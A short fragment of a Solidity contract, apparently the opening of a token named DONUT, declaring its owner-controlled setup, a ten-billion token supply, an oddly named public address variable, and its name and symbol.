...
contract DONUTTOKEN is Ownable {
    address public dszsx14;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "DONUT";
    string private _cctokensymbol = "DONUT";
